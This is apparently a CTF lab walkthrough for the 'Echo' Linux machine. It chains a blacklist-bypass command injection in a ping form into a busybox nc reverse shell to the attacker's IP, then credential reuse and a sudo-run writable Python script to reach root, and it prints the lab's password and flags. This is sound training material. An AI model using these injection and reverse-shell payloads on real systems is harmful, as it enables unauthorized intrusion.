+++
title = "Echo - Walkthrough"
date = "2026-10-31"
author = "nvru"
description = "Walkthrough for the Echo machine (Easy Linux)."
tags = [
  "ctf",
  "walkthrough",
  "linux",
  "apache",
  "command-injection",
  "blacklist-bypass",
  "busybox",
  "credential-reuse",
  "sudo",
  "privilege-escalation",
  "easy"
]
draft = false
+++

## Overview

- **Attacker IP:** `192.168.122.1`
- **Target Machine IP:** `192.168.122.51`
- **Difficulty:** `Easy`

The objective was to enumerate the target, identify exposed services, gain initial access through a command injection vulnerability in a ping utility, and escalate privileges by abusing sudo access to a report utility whose Python script was writable by a non-privileged group.

---

## Port Scanning

### RustScan

```bash
rustscan -a 192.168.122.51 -- -sV -sC -A -oA nmap/rust-init
```

### Results

```text
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 10.2p1 Ubuntu 2ubuntu3.6 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack Apache httpd 2.4.66 ((Ubuntu))
| http-robots.txt: 2 disallowed entries
|_/backups/ /config.php
|_http-title: Echo Diagnostics | Network Appliance
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.66 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Only two services were exposed:

- SSH on port **22**
- Apache HTTP Server on port **80**

The web application became the primary attack surface.

---

## Enumeration

### HTTP Enumeration

Browsing to the web server loaded **Echo Diagnostics**, a network appliance interface.

The page disclosed the name of a daemon along with its absolute path, the system administrator name **clara**, and a text box used to ping servers.

![HTTP page](/images/hmv/echo/http.png)

To make the virtual host easier to work with, I added it to `/etc/hosts`.

```bash
echo '192.168.122.51 echo.hmv' | sudo tee -a /etc/hosts
```

The initial scan had already revealed two disallowed entries in `robots.txt`:

```text
/backups/
/config.php
```

---

### Backups Directory

Checking `/backups/` revealed a file named `dev_notes.txt`.

![Developer note](/images/hmv/echo/dev_note.png)

```text
Internal Note - DevOps Echo Team
---------------------------------
Hi Clara,

Please remember that system administration accounts must not share credentials with web database connections in config.php.
Also, the echo-report utility in /usr/local/bin has been configured with sudo access for the 'devs' team so you can test node health summaries without requesting root password.

- DevOps Lead
```

The note leaked two important pieces of information:

- Credentials were stored in `config.php`
- The `devs` group could run `echo-report` through sudo

---

### Ping Functionality

Before attempting injection, I verified that the ping form actually executed commands on the target by monitoring traffic on my machine.

```bash
sudo tcpdump -i virbr0 -v
```

The target successfully pinged my host from the web interface.

![Ping test](/images/hmv/echo/tcpdump.png)

![Ping response](/images/hmv/echo/ping.png)

---

### Command Injection

The ping input was passed to a shell command, so I tested for command injection.

The application used a blacklist that blocked semicolons and backticks.

![Filtered input](/images/hmv/echo/filter.png)

However, other shell metacharacters were still accepted, such as the pipe character `|` and `&`.

```text
127.0.0.1 | id
```

The command executed successfully.

![Command injection](/images/hmv/echo/command_inject.png)

The target also had `busybox` available.

![Busybox](/images/hmv/echo/which_busybox.png)

---

## Initial Access

With command execution confirmed, I used `busybox nc` to spawn a reverse shell through the vulnerable ping field.

```text
127.0.0.1 | busybox nc 192.168.122.1 4444 -e /bin/sh
```

The payload connected back to my listener and provided a shell as **www-data**.

![Reverse shell](/images/hmv/echo/rev.png)

---

## Privilege Escalation

### www-data → clara

The `config.php` file referenced in the developer note contained credentials for Clara's database account.

![config.php](/images/hmv/echo/config_php.png)

No database service was running, so the credentials could not be used for their intended purpose. I tested them against the system account instead.

The credentials worked.

![su clara](/images/hmv/echo/su_clara.png)

---

### Enumerating Clara

Clara was a member of the **devs** group, matching the information from the developer note.

```bash
groups
```

![Clara groups](/images/hmv/echo/clara_groups.png)

Checking the local accounts showed only the default Ubuntu user, `clara`, and `root`.

```bash
cat /etc/passwd | grep sh$
```

![Users](/images/hmv/echo/users.png)

`doas` was not available on the machine.

From the reverse shell, sudo did not show the expected permissions. The reason was group membership: the new group was only applied in a fresh login session. After connecting over SSH as Clara, the sudo rule was visible.

```bash
ssh clara@echo.hmv
sudo -l
```

![sudo permissions](/images/hmv/echo/sudo_clara.png)

Clara could run the following binary as root without a password:

```text
/usr/local/bin/echo-report
```

---

### devs group → root

Since Clara belonged to `devs`, I searched for files associated with that group.

```bash
find / -group devs 2>/dev/null
```

The search revealed `/opt/echo`, a directory that Clara could write to.

![devs group files](/images/hmv/echo/find_dev_group_files.png)

Inspecting the report utility showed that it executed a Python script.

![echo-report](/images/hmv/echo/echo_reporter.png)

The script contained the `run_report()` function.

![reporter.py](/images/hmv/echo/reposter_py.png)

Because the script was writable by the `devs` group, I replaced its contents with a payload that spawned a shell.

```python
import os

def run_report():
    os.execl("/bin/sh", "sh")
```

![Modified script](/images/hmv/echo/new_reposter.png)

Running the report utility through sudo executed the modified script as root.

```bash
sudo /usr/local/bin/echo-report
```

![Root shell](/images/hmv/echo/sudo_echo_reporter.png)

Root access was obtained.

---

## Credentials

```text
SSH:
    clara:EchoSummer2026!
```

---

## Flags

```text
user:HMV{7e3a91c4b2d840f6a1e582c39d04b6a8}

root:HMV{5c1b82e9f403d7a86b2914c03e87d19f}
```
